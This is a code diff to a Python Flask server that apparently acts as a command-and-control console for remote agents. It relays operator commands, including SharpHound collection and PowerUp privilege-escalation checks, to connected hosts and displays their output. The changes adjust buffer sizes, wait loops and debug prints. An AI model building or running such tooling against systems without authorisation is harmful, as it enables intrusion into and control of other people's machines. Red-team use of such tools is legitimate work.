@@ -43,8 +43,9 @@ def handle_connection(connection,address,thread_index):
     
     while CMD_INPUT[thread_index]!='quit':
         #connection.settimeout(5)
-
-        msg = connection.recv(BUFFER_SIZE).decode()
+        if CMD_INPUT[thread_index]=="powerup":
+            time.sleep(5)
+        msg = connection.recv(10240000).decode()
         #print("length of message is "+str(len(msg)))
         #while len(msg)==0 or msg!="Hello World":
             #msg = connection.recv(BUFFER_SIZE).decode()
@@ -198,19 +199,25 @@ def execute(agentname):
             if agentname in i.name:
                 req_index = THREADS.index(i)
         prev = CMD_OUTPUT[req_index]
+        print("previous value->"+prev)
         CMD_INPUT[req_index]=cmd
+        #time.sleep(2)
         if cmd=="Get-SharpHoundZip":
             CMD_OUTPUT[req_index]="Trying to initiate transfer... If you get incorrect or less data, run it again"
             #time.sleep(3)
             cmdoutput = CMD_OUTPUT[req_index]
             return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
         #time.sleep(5)
-        cmdoutput = CMD_OUTPUT[req_index]
-        while (prev==CMD_OUTPUT[req_index] and counter<6) or prev=="Hello World":
+        if cmd=="powerup":
+            time.sleep(20)
+        while (prev==CMD_OUTPUT[req_index] and counter<10) or prev=="Hello World":
             time.sleep(0.5)
             counter+=1
         if counter>1:
             cmdoutput = CMD_OUTPUT[req_index]
+            #counter = 0
+        cmdoutput = CMD_OUTPUT[req_index]
+        print("Latest value->"+cmdoutput)
         return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
     if request.method=='POST':
         cmd = request.form['command']
@@ -224,20 +231,22 @@ def execute(agentname):
             time.sleep(6)
         time.sleep(1)
         cmdoutput = CMD_OUTPUT[req_index]
-        while (prev==CMD_OUTPUT[req_index] and counter<6) or prev=="Hello World":
+        while (prev==CMD_OUTPUT[req_index] and counter<10) or prev=="Hello World":
             time.sleep(0.5)
             counter+=1
         if counter>0:
             cmdoutput = CMD_OUTPUT[req_index]
+            counter=0
         return render_template('execute.html',cmdoutput=cmdoutput,name=agentname,ips=IPS)
 
 
 #@app.route("/<agentname")
 
 
+
 @app.route("/temp",methods=['GET','POST'])
 def temp():
-    return render_template("temp.html")
+    return render_template("execute.html")
 
 if __name__=='__main__':
     app.run(debug=True)
